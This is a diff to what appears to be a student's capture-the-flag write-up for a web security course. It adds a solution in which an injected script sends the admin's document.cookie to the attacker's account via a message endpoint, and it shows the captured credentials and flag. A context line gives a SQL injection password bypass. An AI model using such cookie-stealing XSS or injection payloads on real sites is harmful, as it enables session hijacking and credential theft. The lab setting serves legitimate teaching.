@@ -33,5 +33,32 @@ type `' OR password like '%%` in the password field to match any password
 # 4
 > Username: `testing`
 ## Solution
+Sent the below code as the message to `admin`, the received message was 
+```js
+{
+    sender:admin,
+    recipient:reallynow,
+    message:
+        username=admin; 
+        password=admin; 
+        flag=csce465{xss_ftw_4f93062d}
+}
+```
+
 ## Code
+```html
+<script>
+    var formData = new FormData();
+    formData.append('message', document.cookie);
+    formData.append('recipient', 'reallynow');
+    formData.append('name', 'admin');
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://csce465shell.martincarlisle.com/problem/19369/sendmessage.php', true);
+    xhr.send(formData);
+
+    //# sourceURL=dynamicScript.js 
+</script>
+```
 ## Help Received
+[https://stackoverflow.com/questions/58217910/xmlhttprequest-not-sending-post-data](https://stackoverflow.com/questions/58217910/xmlhttprequest-not-sending-post-data)
